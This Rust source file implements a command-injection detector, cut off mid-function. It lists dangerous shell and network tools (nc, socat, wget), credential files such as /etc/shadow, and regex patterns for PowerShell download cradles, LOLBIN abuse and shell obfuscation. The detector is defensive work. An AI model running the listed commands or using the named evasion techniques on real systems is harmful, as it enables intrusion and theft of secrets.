//! Command Injection Evaluator — Level 2 Invariant Detection
//!
//! INVARIANT PROPERTY: Safe user input for shell context contains ZERO
//! shell control flow tokens. Any input that creates new command boundaries,
//! substitutions, redirections, or variable expansions violates the data-only
//! invariant.
//!
//! Detection is structural (token-based), not signature-based.
//! Known commands BOOST confidence, they never GATE detection.

use crate::evaluators::{EvidenceOperation, L2Detection, L2Evaluator, ProofEvidence};
use crate::tokenizers::shell::{ShellTokenType, ShellTokenizer};
use crate::types::InvariantClass;
use regex::Regex;

const KNOWN_DANGEROUS_COMMANDS: &[&str] = &[
    "id",
    "whoami",
    "uname",
    "hostname",
    "pwd",
    "env",
    "printenv",
    "sh",
    "bash",
    "zsh",
    "csh",
    "ksh",
    "dash",
    "fish",
    "cmd",
    "powershell",
    "pwsh",
    "cat",
    "head",
    "tail",
    "more",
    "less",
    "tac",
    "nl",
    "ls",
    "dir",
    "find",
    "locate",
    "which",
    "whereis",
    "cp",
    "mv",
    "rm",
    "rmdir",
    "mkdir",
    "touch",
    "chmod",
    "chown",
    "dd",
    "tar",
    "gzip",
    "gunzip",
    "zip",
    "unzip",
    "curl",
    "wget",
    "nc",
    "ncat",
    "netcat",
    "telnet",
    "ssh",
    "ping",
    "traceroute",
    "dig",
    "nslookup",
    "host",
    "ifconfig",
    "ip",
    "netstat",
    "ss",
    "ps",
    "top",
    "htop",
    "w",
    "last",
    "who",
    "df",
    "du",
    "free",
    "mount",
    "fdisk",
    "lsblk",
    "crontab",
    "at",
    "systemctl",
    "service",
    "base64",
    "xxd",
    "od",
    "hexdump",
    "gpg",
    "openssl",
    "certutil",
    "python",
    "python2",
    "python3",
    "perl",
    "ruby",
    "node",
    "php",
    "java",
    "javac",
    "gcc",
    "make",
    "kill",
    "killall",
    "nohup",
    "screen",
    "tmux",
    "sudo",
    "su",
    "doas",
    "useradd",
    "usermod",
    "passwd",
    "iptables",
    "nft",
    "reboot",
    "shutdown",
    "halt",
    "init",
    "awk",
    "sed",
    "grep",
    "xargs",
    "tee",
    "sort",
    "tr",
    "cut",
    "socat",
    "nmap",
    "scp",
    "sftp",
    "ftp",
];

const SENSITIVE_FILES: &[&str] = &[
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/ssh/sshd_config",
    "/root/.ssh/authorized_keys",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/auth.log",
    "/var/log/syslog",
    "C:\\Windows\\System32\\config\\SAM",
    "C:\\Windows\\win.ini",
    "C:\\boot.ini",
];

const POWERSHELL_DOWNLOAD_MARKERS: &[&str] = &[
    "downloadstring",
    "downloadfile",
    "invoke-webrequest",
    "start-bitstransfer",
    "new-object net.webclient",
    "net.webclient",
    "http://",
    "https://",
];

const POWERSHELL_EXEC_MARKERS: &[&str] = &[
    "iex",
    "invoke-expression",
    "-enc",
    "-encodedcommand",
    "frombase64string",
];

fn is_control_flow(t: ShellTokenType) -> bool {
    matches!(
        t,
        ShellTokenType::Separator
            | ShellTokenType::Pipe
            | ShellTokenType::AndChain
            | ShellTokenType::OrChain
            | ShellTokenType::Background
    )
}

fn is_substitution(t: ShellTokenType) -> bool {
    matches!(
        t,
        ShellTokenType::CmdSubstOpen | ShellTokenType::BacktickSubst
    )
}

fn is_known_dangerous(word: &str) -> bool {
    KNOWN_DANGEROUS_COMMANDS.contains(&word.to_lowercase().as_str())
}

fn looks_like_executable_path(value: &str) -> bool {
    static UNIX_EXEC_PATH_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
        Regex::new(r"^/(?:bin|sbin|usr/bin|usr/sbin|usr/local/bin)/").unwrap()
    });
    static WINDOWS_EXEC_PATH_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
        Regex::new(r"(?i)^[A-Z]:\\(?:Windows|Program\s*Files)").unwrap()
    });
    UNIX_EXEC_PATH_RE.is_match(value) || WINDOWS_EXEC_PATH_RE.is_match(value)
}

fn looks_like_filesystem_path(value: &str) -> bool {
    static WINDOWS_PATH_RE: std::sync::LazyLock<Regex> =
        std::sync::LazyLock::new(|| Regex::new(r"(?i)^[A-Z]:\\").unwrap());
    value.starts_with("/") && value.len() > 1 && value.as_bytes()[1].is_ascii_alphabetic()
        || WINDOWS_PATH_RE.is_match(value)
        || value.starts_with("./")
}

pub struct CmdInjectionEvaluator;

impl CmdInjectionEvaluator {
    fn find_next_word<'a>(
        &self,
        tokens: &'a [crate::tokenizers::Token<ShellTokenType>],
        start: usize,
    ) -> Option<&'a crate::tokenizers::Token<ShellTokenType>> {
        for i in start..tokens.len().min(start + 5) {
            if matches!(
                tokens[i].token_type,
                ShellTokenType::Word | ShellTokenType::Flag
            ) {
                return Some(&tokens[i]);
            }
        }
        None
    }

    fn detect_control_flow(
        &self,
        tokens: &[crate::tokenizers::Token<ShellTokenType>],
        raw_input: &str,
        dets: &mut Vec<L2Detection>,
    ) {
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|t| {
                !matches!(
                    t.token_type,
                    ShellTokenType::Whitespace | ShellTokenType::Newline
                )
            })
            .collect();

        for (_i, tok) in meaningful.iter().enumerate() {
            if !is_control_flow(tok.token_type) {
                continue;
            }

            let next_word = self.find_next_word(tokens, tok.end);
            let next_val = next_word
                .map(|w| w.value.to_lowercase())
                .unwrap_or_default();

            let mut confidence: f64 = 0.75;
            if !next_val.is_empty() && is_known_dangerous(&next_val) {
                confidence = 0.88;
            }
            if next_word.is_some() && looks_like_executable_path(&next_word.unwrap().value) {
                confidence = 0.85;
            }
            let after_sep = &raw_input[tok.end.min(raw_input.len())..];
            if SENSITIVE_FILES.iter().any(|f| after_sep.contains(f)) {
                confidence = confidence.max(0.92);
            }

            let type_label = match tok.token_type {
                ShellTokenType::Pipe => "pipe",
                ShellTokenType::AndChain => "AND chain",
                ShellTokenType::OrChain => "OR chain",
                ShellTokenType::Background => "background",
                _ => "separator",
            };

            dets.push(L2Detection {
                detection_type: "separator".into(),
                confidence,
                detail: format!(
                    "Shell control flow: {} creates new command boundary{}",
                    tok.value,
                    if !next_val.is_empty() {
                        format!(" → {}", next_val)
                    } else {
                        String::new()
                    }
                ),
                position: tok.start,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::ContextEscape,
                    matched_input: tok.value.clone(),
                    interpretation: format!(
                        "Shell {} operator creates command boundary",
                        type_label
                    ),
                    offset: tok.start,
                    property: "User input must not create new shell command boundaries".into(),
                }],
            });
        }
    }

    fn detect_substitutions(
        &self,
        tokens: &[crate::tokenizers::Token<ShellTokenType>],
        dets: &mut Vec<L2Detection>,
    ) {
        for tok in tokens {
            if !is_substitution(tok.token_type) {
                continue;
            }

            if tok.token_type == ShellTokenType::BacktickSubst {
                let content = tok.value.trim_matches('`').trim();
                let first_word = content
                    .split_whitespace()
                    .next()
                    .unwrap_or("")
                    .to_lowercase();

                let mut confidence = 0.78;
                if is_known_dangerous(&first_word) {
                    confidence = 0.92;
                }
                if content.is_empty() {
                    confidence = 0.75;
                }

                dets.push(L2Detection {
                    detection_type: "substitution".into(),
                    confidence,
                    detail: "Command substitution: backtick executes shell command".into(),
                    position: tok.start,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: tok.value.clone(),
                        interpretation:
                            "Backtick command substitution executes embedded shell command".into(),
                        offset: tok.start,
                        property: "User input must not contain command substitution operators"
                            .into(),
                    }],
                });
            }

            if tok.token_type == ShellTokenType::CmdSubstOpen {
                let next_word = self.find_next_word(tokens, tok.end);
                let cmd_name = next_word
                    .map(|w| w.value.to_lowercase())
                    .unwrap_or_default();

                let mut confidence = 0.78;
                if is_known_dangerous(&cmd_name) {
                    confidence = 0.92;
                }
                if next_word.is_none() {
                    confidence = 0.75;
                }

                dets.push(L2Detection {
                    detection_type: "substitution".into(),
                    confidence,
                    detail: format!(
                        "Command substitution: $() executes shell command{}",
                        if !cmd_name.is_empty() {
                            format!(" → {}", cmd_name)
                        } else {
                            String::new()
                        }
                    ),
                    position: tok.start,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: tok.value.clone(),
                        interpretation:
                            "Dollar-paren command substitution executes embedded shell command"
                                .into(),
                        offset: tok.start,
                        property: "User input must not contain command substitution operators"
                            .into(),
                    }],
                });
            }
        }
    }

    fn detect_variable_expansion(
        &self,
        tokens: &[crate::tokenizers::Token<ShellTokenType>],
        dets: &mut Vec<L2Detection>,
    ) {
        for tok in tokens {
            if tok.token_type != ShellTokenType::VarExpansion {
                continue;
            }

            let var_name = tok
                .value
                .trim_start_matches('$')
                .trim_start_matches('{')
                .trim_end_matches('}');
            let mut confidence = 0.75;

            if var_name == "IFS" {
                confidence = 0.88;
            }
            if ["PATH", "HOME", "SHELL", "USER", "HOSTNAME"].contains(&var_name) {
                confidence = 0.80;
            }
            static SPECIAL_VAR_RE: std::sync::LazyLock<Regex> =
                std::sync::LazyLock::new(|| Regex::new(r"^[0-9?!$@*#]$").unwrap());
            if SPECIAL_VAR_RE.is_match(var_name) {
                confidence = 0.76;
            }

            dets.push(L2Detection {
                detection_type: "variable_expansion".into(),
                confidence,
                detail: format!(
                    "Shell variable expansion: {} — input triggers shell interpretation",
                    tok.value
                ),
                position: tok.start,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: tok.value.clone(),
                    interpretation: format!(
                        "Shell variable ${} triggers environment/IFS expansion",
                        var_name
                    ),
                    offset: tok.start,
                    property: "User input must not trigger shell variable expansion".into(),
                }],
            });
        }
    }

    fn detect_quote_fragmentation(
        &self,
        _tokens: &[crate::tokenizers::Token<ShellTokenType>],
        raw_input: &str,
        dets: &mut Vec<L2Detection>,
    ) {
        // Regex fallback: alternating char-quote-char sequences
        static FRAGMENT_PROBE_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r#"(?i)[a-z]['"][a-z]['"][a-z]"#).unwrap());
        static FRAGMENT_FULL_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r#"(?i)(?:[a-z]['"]){2,}[a-z]"#).unwrap());
        let re = &*FRAGMENT_PROBE_RE;
        if re.is_match(raw_input) {
            let full_re = &*FRAGMENT_FULL_RE;
            if let Some(m) = full_re.find(raw_input) {
                let matched = m.as_str();
                let reconstructed: String = matched
                    .chars()
                    .filter(|c| *c != '\'' && *c != '"')
                    .collect();

                let mut confidence = 0.75;
                if is_known_dangerous(&reconstructed) {
                    confidence = 0.92;
                }

                dets.push(L2Detection {
                    detection_type: "quote_fragmentation".into(),
                    confidence,
                    detail: format!(
                        "Quote fragmentation: '{}' reconstructs to '{}'",
                        matched, reconstructed
                    ),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: matched.to_owned(),
                        interpretation: format!(
                            "Quote-split tokens concatenate to executable command '{}'",
                            reconstructed
                        ),
                        offset: m.start(),
                        property:
                            "User input must not use quote fragmentation to obscure command names"
                                .into(),
                    }],
                });
            }
        }
    }

    fn detect_glob_paths(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
        static re: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?:^|[\s;|&])(/?(?:[\w?*\[\]]+/)+[\w?*\[\]]+)").unwrap()
        });
        for m in re.find_iter(raw_input) {
            let path = m.as_str().trim();
            static GLOB_CHAR_RE: std::sync::LazyLock<Regex> =
                std::sync::LazyLock::new(|| Regex::new(r"[?*\[\]]").unwrap());
            if GLOB_CHAR_RE.is_match(path) && path.contains('/') {
                let glob_count = path
                    .chars()
                    .filter(|c| matches!(c, '?' | '*' | '[' | ']'))
                    .count();
                let alpha_count = path.chars().filter(|c| c.is_ascii_alphabetic()).count();
                let is_obfuscated = glob_count > alpha_count;

                let mut confidence: f64 = 0.75;
                if is_obfuscated {
                    confidence = 0.85;
                }
                if path.starts_with('/') && path.split('/').filter(|s| !s.is_empty()).count() >= 2 {
                    confidence = confidence.max(0.82);
                }

                dets.push(L2Detection {
                    detection_type: "glob_path".into(),
                    confidence,
                    detail: format!("Glob wildcard in path position: '{}' — shell expands to executable", path),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: path.to_owned(),
                        interpretation: "Glob wildcards in path position resolve to executable via shell expansion".into(),
                        offset: m.start(),
                        property: "User input must not contain glob metacharacters in filesystem path positions".into(),
                    }],
                });
            }
        }
    }

    fn detect_argument_injection(
        &self,
        tokens: &[crate::tokenizers::Token<ShellTokenType>],
        dets: &mut Vec<L2Detection>,
    ) {
        static dangerous_long: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)^--(?:exec|filter|output|config|file|eval|command|shell|load|import|require|post-file|upload-file)").unwrap()
        });
        static dangerous_short: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"^-[ecoxr]$").unwrap());

        for tok in tokens {
            if tok.token_type != ShellTokenType::Flag {
                continue;
            }

            let flag = &tok.value;
            let flag_lower = flag.to_lowercase();

            if dangerous_long.is_match(&flag_lower)
                || flag_lower == "-exec"
                || flag_lower == "--exec"
            {
                dets.push(L2Detection {
                    detection_type: "argument_injection".into(),
                    confidence: 0.80,
                    detail: format!("Dangerous flag: {} — alters program execution", flag),
                    position: tok.start,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: flag.clone(),
                        interpretation: "Flag argument alters program execution behavior".into(),
                        offset: tok.start,
                        property: "User input must not inject program-altering command flags"
                            .into(),
                    }],
                });
            } else if dangerous_short.is_match(&flag_lower) {
                dets.push(L2Detection {
                    detection_type: "argument_injection".into(),
                    confidence: 0.76,
                    detail: format!("Dangerous short flag: {}", flag),
                    position: tok.start,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: flag.clone(),
                        interpretation: "Short flag may alter program execution".into(),
                        offset: tok.start,
                        property: "User input must not inject program-altering command flags"
                            .into(),
                    }],
                });
            }
        }
    }

    fn detect_redirection(
        &self,
        tokens: &[crate::tokenizers::Token<ShellTokenType>],
        dets: &mut Vec<L2Detection>,
    ) {
        for (i, tok) in tokens.iter().enumerate() {
            if !matches!(
                tok.token_type,
                ShellTokenType::RedirectOut | ShellTokenType::RedirectIn | ShellTokenType::Heredoc
            ) {
                continue;
            }

            let next_word = self.find_next_word(tokens, i + 1);
            let mut confidence = 0.75;

            if let Some(nw) = next_word {
                if looks_like_filesystem_path(&nw.value) {
                    confidence = 0.82;
                }
                if SENSITIVE_FILES.iter().any(|f| nw.value.contains(f)) {
                    confidence = 0.92;
                }
            }

            let direction = if tok.token_type == ShellTokenType::RedirectIn {
                "input"
            } else {
                "output"
            };
            dets.push(L2Detection {
                detection_type: "redirection".into(),
                confidence,
                detail: format!(
                    "Shell {} redirection: {}{}",
                    direction,
                    tok.value,
                    next_word
                        .map(|w| format!(" {}", w.value))
                        .unwrap_or_default()
                ),
                position: tok.start,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::ContextEscape,
                    matched_input: tok.value.clone(),
                    interpretation: format!("Shell {} redirection operator", direction),
                    offset: tok.start,
                    property: "User input must not contain shell redirection operators".into(),
                }],
            });
        }
    }

    fn detect_powershell_cradle(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
        let lowered = raw_input.to_lowercase();
        if !lowered.contains("powershell") && !lowered.contains("pwsh") {
            return;
        }

        let has_download = POWERSHELL_DOWNLOAD_MARKERS
            .iter()
            .any(|m| lowered.contains(m));
        let has_exec = POWERSHELL_EXEC_MARKERS.iter().any(|m| lowered.contains(m));
        if has_download && has_exec {
            dets.push(L2Detection {
                detection_type: "powershell_cradle".into(),
                confidence: 0.94,
                detail: "PowerShell download cradle chain (download + execution marker)".into(),
                position: 0,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: extract_match(raw_input, "(?i)(powershell|pwsh).{0,140}").unwrap_or_else(|| raw_input.to_owned()),
                    interpretation: "Input contains PowerShell cradle semantics that fetch and execute remote payloads".into(),
                    offset: 0,
                    property: "User input must not contain PowerShell patterns that combine payload retrieval with execution".into(),
                }],
            });
        }
    }

    fn detect_lolbin_abuse(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
        let patterns = [
            (
                "(?i)\\bcertutil\\b[^\\n]{0,220}(?:^|\\s)-urlcache(?:\\s|$)[^\\n]{0,80}(?:^|\\s)-f(?:\\s|$)",
                "certutil urlcache download primitive",
            ),
            (
                "(?i)\\bwmic\\b[^\\n]{0,180}\\bprocess\\b[^\\n]{0,80}\\bcall\\b[^\\n]{0,60}\\bcreate\\b",
                "wmic process create execution primitive",
            ),
            (
                "(?i)\\bbitsadmin\\b[^\\n]{0,120}\\b/transfer\\b",
                "bitsadmin transfer primitive",
            ),
            (
                "(?i)\\b(mshta|rundll32|regsvr32)\\b[^\\n]{0,200}(http://|https://|javascript:)",
                "LOLBIN remote execution primitive",
            ),
        ];

        for (pat, detail) in patterns {
            if let Some(matched) = extract_match(raw_input, pat) {
                dets.push(L2Detection {
                    detection_type: "lolbin_abuse".into(),
                    confidence: 0.90,
                    detail: detail.into(),
                    position: raw_input.find(&matched).unwrap_or(0),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: matched.clone(),
                        interpretation: "Input invokes a known living-off-the-land binary abuse pattern".into(),
                        offset: raw_input.find(&matched).unwrap_or(0),
                        property: "User input must not introduce LOLBIN command chains that execute or fetch payloads".into(),
                    }],
                });
            }
        }
    }

    fn detect_env_substring_expansion(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
        static PERCENT_SUBSTR_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)%[a-z_][a-z0-9_]*:~[-]?[0-9]+(?:,[-]?[0-9]+)?%").unwrap()
        });
        static BANG_SUBSTR_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)![a-z_][a-z0-9_]*:~[-]?[0-9]+(?:,[-]?[0-9]+)?!").unwrap()
        });
        for re in [&*PERCENT_SUBSTR_RE, &*BANG_SUBSTR_RE] {
            for m in re.find_iter(raw_input) {
                dets.push(L2Detection {
                    detection_type: "env_substring_expansion".into(),
                    confidence: 0.91,
                    detail: "Windows environment substring expansion used for command obfuscation".into(),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: m.as_str().to_owned(),
                        interpretation: "Input uses Windows variable substring slicing to construct metacharacters/commands".into(),
                        offset: m.start(),
                        property: "User input must not use environment substring expansion for shell payload construction".into(),
                    }],
                });
            }
        }
    }

    fn detect_ifs_manipulation(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
        static re: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?i)(?:^|[\s;&|])IFS\s*=").unwrap());
        for m in re.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "ifs_manipulation".into(),
                confidence: 0.90,
                detail: "IFS reassignment detected — shell tokenization boundary manipulation".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::ContextEscape,
                    matched_input: m.as_str().trim().to_owned(),
                    interpretation: "Input manipulates shell field separator semantics to reshape argument boundaries".into(),
                    offset: m.start(),
                    property: "User input must not alter shell IFS parsing behavior".into(),
                }],
            });
        }
    }

    fn detect_shell_evasion_patterns(
        &self,
        raw_input: &str,
        original_input: &str,
        dets: &mut Vec<L2Detection>,
    ) {
        static BRACE_EXPANSION_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)(?:^|[\s;|&])\{[a-z_][a-z0-9_]{1,20},[^}\n]{1,220}\}").unwrap()
        });
        static TAB_SEPARATOR_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)(?:^|[\s;|&])(?:id|whoami|uname|cat|sh|bash|curl|wget)\t+\S+").unwrap()
        });
        static VAR_CHAIN_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)(?:\$(?:\{?[a-z_][a-z0-9_]*\}?)){3,}").unwrap()
        });
        static ANSI_C_QUOTE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(
                r#"(?i)\$'(?:(?:\\x[0-9a-f]{2}|\\[0-7]{1,3}|\\[abfnrtv\\'"?])|[^']){1,220}'"#,
            )
            .unwrap()
        });
        static HERE_STRING_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?i)<<<").unwrap());
        static PS_CONCAT_PLUS_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)"[^"\r\n]{1,80}"\s*\+\s*"[^"\r\n]{1,80}""#).unwrap()
        });
        static PS_JOIN_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)(?:^|[\s;|&])-join\s*\(\s*(?:'[^'\r\n]{1,8}'\s*,\s*){2,}'[^'\r\n]{1,8}'\s*\)"#).unwrap()
        });
        static PROCESS_SUB_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?i)<\([^)\n]{1,220}\)").unwrap());
        static LINE_CONTINUATION_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)[a-z0-9_/.-]\\\r?\n[a-z0-9_/.-]").unwrap()
        });
        static ARITH_CMD_SUB_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\$\(\(\s*\$\([^)\n]{1,220}\)\s*\)\)").unwrap()
        });

        for m in BRACE_EXPANSION_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "shell_evasion_brace_expansion".into(),
                confidence: 0.89,
                detail: "Brace expansion can synthesize command/argument boundaries".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Brace expansion can rewrite token structure before command execution"
                            .into(),
                    offset: m.start(),
                    property:
                        "User input must not contain shell brace expansion in command context"
                            .into(),
                }],
            });
        }

        for m in TAB_SEPARATOR_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "shell_evasion_tab_separator".into(),
                confidence: 0.84,
                detail: "Tab separator used as whitespace command delimiter".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::ContextEscape,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Horizontal tab creates shell argument separation equivalent to space"
                            .into(),
                    offset: m.start(),
                    property: "User input must not introduce hidden command delimiters".into(),
                }],
            });
        }

        for m in VAR_CHAIN_RE.find_iter(raw_input) {
            let matched = m.as_str();
            if matched.contains("${") || matched.matches('$').count() >= 3 {
                dets.push(L2Detection {
                    detection_type: "shell_evasion_var_chain".into(),
                    confidence: 0.86,
                    detail: "Chained variable expansion can reconstruct command text".into(),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: matched.to_owned(),
                        interpretation: "Multiple adjacent variable expansions can synthesize executable names".into(),
                        offset: m.start(),
                        property: "User input must not use chained variable expansion to construct shell commands".into(),
                    }],
                });
            }
        }

        for m in ANSI_C_QUOTE_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "shell_evasion_ansi_c_quote".into(),
                confidence: 0.90,
                detail: "ANSI-C quoting payload detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "ANSI-C quoted bytes/chars decode into executable command text"
                        .into(),
                    offset: m.start(),
                    property: "User input must not contain ANSI-C shell quoting constructs".into(),
                }],
            });
        }

        for m in HERE_STRING_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "shell_evasion_here_string".into(),
                confidence: 0.88,
                detail: "Here-string operator detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::ContextEscape,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Here-string redirects attacker-controlled inline data into command stdin"
                            .into(),
                    offset: m.start(),
                    property: "User input must not contain shell here-string operators".into(),
                }],
            });
        }

        let lowered = raw_input.to_lowercase();
        let lowered_original = original_input.to_lowercase();
        let ps_context = lowered.contains("powershell")
            || lowered.contains("pwsh")
            || lowered_original.contains("powershell")
            || lowered_original.contains("pwsh");
        if ps_context {
            for m in PS_CONCAT_PLUS_RE.find_iter(original_input) {
                dets.push(L2Detection {
                    detection_type: "shell_evasion_powershell_concat".into(),
                    confidence: 0.88,
                    detail: "PowerShell string concatenation obfuscation detected".into(),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: m.as_str().to_owned(),
                        interpretation: "PowerShell string concatenation can reconstruct blocked command identifiers".into(),
                        offset: m.start(),
                        property: "User input must not use PowerShell string concatenation obfuscation".into(),
                    }],
                });
            }
            for m in PS_JOIN_RE.find_iter(original_input) {
                dets.push(L2Detection {
                    detection_type: "shell_evasion_powershell_concat".into(),
                    confidence: 0.88,
                    detail: "PowerShell string concatenation obfuscation detected".into(),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: m.as_str().to_owned(),
                        interpretation:
                            "PowerShell -join can reconstruct blocked command identifiers".into(),
                        offset: m.start(),
                        property:
                            "User input must not use PowerShell string concatenation obfuscation"
                                .into(),
                    }],
                });
            }
        }

        for m in PROCESS_SUB_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "shell_evasion_process_substitution".into(),
                confidence: 0.91,
                detail: "Bash process substitution detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Process substitution executes nested command and exposes output as pseudo-file".into(),
                    offset: m.start(),
                    property: "User input must not contain process substitution constructs".into(),
                }],
            });
        }

        for m in LINE_CONTINUATION_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "shell_evasion_line_continuation".into(),
                confidence: 0.87,
                detail: "Backslash-newline line continuation detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Line continuation joins split tokens into executable command text".into(),
                    offset: m.start(),
                    property: "User input must not contain shell line-continuation obfuscation"
                        .into(),
                }],
            });
        }

        for m in ARITH_CMD_SUB_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "shell_evasion_arith_cmd_sub".into(),
                confidence: 0.92,
                detail: "Arithmetic context command substitution detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Arithmetic expansion wraps and executes command substitution payload"
                            .into(),
                    offset: m.start(),
                    property: "User input must not contain nested arithmetic command substitution"
                        .into(),
                }],
            });
        }
    }

    fn detect_powershell_modern_bypasses(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
        let lowered = raw_input.to_lowercase();
        let ps_context = lowered.contains("powershell")
            || lowered.contains("pwsh")
            || lowered.contains("iex")
            || lowered.contains("invoke-expression")
            || lowered.contains("iwr")
            || lowered.contains("invoke-webrequest");
        if !ps_context {
            return;
        }

        static IEX_IWR_CHAIN_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\b(?:iex|invoke-expression)\b[^\n]{0,220}\b(?:iwr|invoke-webrequest)\b|\b(?:iwr|invoke-webrequest)\b[^\n]{0,220}\b(?:iex|invoke-expression)\b").unwrap()
        });
        static ENCODED_CMD_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\b(?:powershell|pwsh)\b[^\n]{0,220}\s-(?:enc|encodedcommand)\s+[A-Za-z0-9+/]{16,}={0,2}\b").unwrap()
        });
        static PS_SINGLE_QUOTE_CONCAT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(
            || {
                Regex::new(r#"(?i)'[^'\r\n]{1,40}'(?:\s*\+\s*|\s+)'[^'\r\n]{1,40}'(?:(?:\s*\+\s*|\s+)'[^'\r\n]{1,40}')*"#).unwrap()
            },
        );
        static PS_VAR_EXPANSION_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\$(?:env:)?[a-z_][a-z0-9_]*(?::[a-z_][a-z0-9_]*)?").unwrap()
        });
        static PS_FORMAT_OP_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)'[^'\r\n]{1,80}'\s*-f\s*(?:'[^'\r\n]{1,40}'|\$[a-z_][a-z0-9_]*)\s*(?:,\s*(?:'[^'\r\n]{1,40}'|\$[a-z_][a-z0-9_]*))*"#).unwrap()
        });

        for m in IEX_IWR_CHAIN_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "powershell_iex_iwr_chain".into(),
                confidence: 0.95,
                detail: "PowerShell IEX/IWR chained execution pattern detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "PowerShell combines web retrieval and expression execution"
                        .into(),
                    offset: m.start(),
                    property:
